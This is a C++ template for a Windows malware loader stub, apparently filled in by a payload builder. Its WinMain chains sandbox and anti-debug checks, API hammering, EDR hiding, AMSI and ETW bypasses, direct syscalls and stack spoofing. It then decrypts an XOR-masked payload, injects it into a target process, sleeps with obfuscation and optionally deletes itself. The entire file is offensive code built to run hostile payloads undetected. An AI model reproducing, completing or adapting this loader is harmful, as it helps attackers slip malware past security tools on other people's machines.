#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <cstdlib>
#include <ctime>

#include "syscalls.hpp"
#include "evasion.hpp"
#include "injection.hpp"
#include "obfuscation.hpp"
#include "aes.hpp"

// __EXT_DEFS__
// __EXT_INCLUDES__

#define CFG_AD_TIMING __AD_TIMING__
#define CFG_AD_NTGLOBAL __AD_NTGLOBAL__
#define CFG_AD_HWBP __AD_HWBP__
#define CFG_AD_TRACER __AD_TRACER__
#define CFG_AD_SANDBOX __AD_SANDBOX__
#define CFG_AD_DELAYED __AD_DELAYED__
#define CFG_AD_DELAY_BASE __AD_DELAY_BASE__
#define CFG_AD_DELAY_JITTER __AD_DELAY_JITTER__
#define CFG_AD_API_HAMMER __AD_API_HAMMER__
#define CFG_AD_API_ROUNDS __AD_API_ROUNDS__
#define CFG_SD_ENABLED __SD_ENABLED__
#define CFG_SD_METHOD __SD_METHOD__
#define CFG_AMSI_ENABLE __AMSI_ENABLE__
#define CFG_SS_ENABLE __SS_ENABLE__
#define CFG_SS_DEPTH __SS_DEPTH__
#define CFG_SLEEP_ENABLED __SLEEP_ENABLED__
#define CFG_SLEEP_BASE __SLEEP_BASE__
#define CFG_SLEEP_JITTER __SLEEP_JITTER__
#define CFG_SLEEP_OBF __SLEEP_OBF__
#define CFG_SLEEP_ALGO __SLEEP_ALGO__
#define CFG_INJ_METHOD __INJ_METHOD__
#define CFG_TARGET_DLL __TARGET_DLL__
#define CFG_TARGET_PID __TARGET_PID__
#define CFG_KEY_LEN __KEY_LEN__

__PAYLOAD_DECL__

static const unsigned char _xor_mask[CFG_KEY_LEN]={__XOR_MASK__};
static const unsigned char _xor_masked[CFG_KEY_LEN]={__XOR_MASKED__};

static InjCtx _ctx;
static unsigned char _xor_key[CFG_KEY_LEN];

__OBF_STRINGS__

__JUNK_FUNCS__

static void _derive_keys(){
    for(int i=0;i<CFG_KEY_LEN;i++)_xor_key[i]=_xor_mask[i]^_xor_masked[i];
    volatile unsigned char* v=(volatile unsigned char*)_xor_mask;
    for(int i=0;i<CFG_KEY_LEN;i++)v[i]=0;
}

int APIENTRY WinMain(HINSTANCE,HINSTANCE,LPSTR,int){
    srand((unsigned)time(0));
    __JUNK_CALL__

    _derive_keys();

    if(CFG_AD_SANDBOX){
        __JUNK_CALL__
        if(_sandbox_check())return 1;
    }

    if(CFG_AD_DELAYED){
        __JUNK_CALL__
        _delayed_execution(CFG_AD_DELAY_BASE,CFG_AD_DELAY_JITTER);
    }

    if(CFG_AD_API_HAMMER){
        __JUNK_CALL__
        _api_hammer(CFG_AD_API_ROUNDS);
    }

    if(AntiDebug(CFG_AD_TIMING,CFG_AD_NTGLOBAL,CFG_AD_HWBP,CFG_AD_TRACER))return 1;
    __JUNK_CALL__

    _hide_edr();
    __JUNK_CALL__

    if(CFG_AMSI_ENABLE){
        _bypass_amsi();
        _bypass_etw();
    }
    __JUNK_CALL__

    _initsys();
    __JUNK_CALL__

    if(CFG_SS_ENABLE){
        _spoof_stack(CFG_SS_DEPTH);
    }
    __JUNK_CALL__

    _ctx.payload=enc_payload;
    _ctx.len=PAYLOAD_LEN;
    _ctx.xor_key=_xor_key;
    _ctx.key_len=CFG_KEY_LEN;

    Inject(&_ctx,CFG_INJ_METHOD,CFG_TARGET_DLL,CFG_TARGET_PID);
    __JUNK_CALL__

    if(CFG_SLEEP_ENABLED){
        unsigned char ak[16]={0};unsigned char av[16]={0};
        bool use_aes=(CFG_SLEEP_ALGO[0]=='a');
        for(;;){
            _obf_sleep(_ctx.payload,_ctx.len,_ctx.xor_key,_ctx.key_len,
                CFG_SLEEP_BASE,CFG_SLEEP_JITTER,use_aes,ak,av);
        }
    }

    volatile unsigned char* vx=(volatile unsigned char*)_xor_key;
    for(int i=0;i<CFG_KEY_LEN;i++)vx[i]=0;

    if(CFG_SD_ENABLED){
        _self_delete();
    }

    return 0;
}
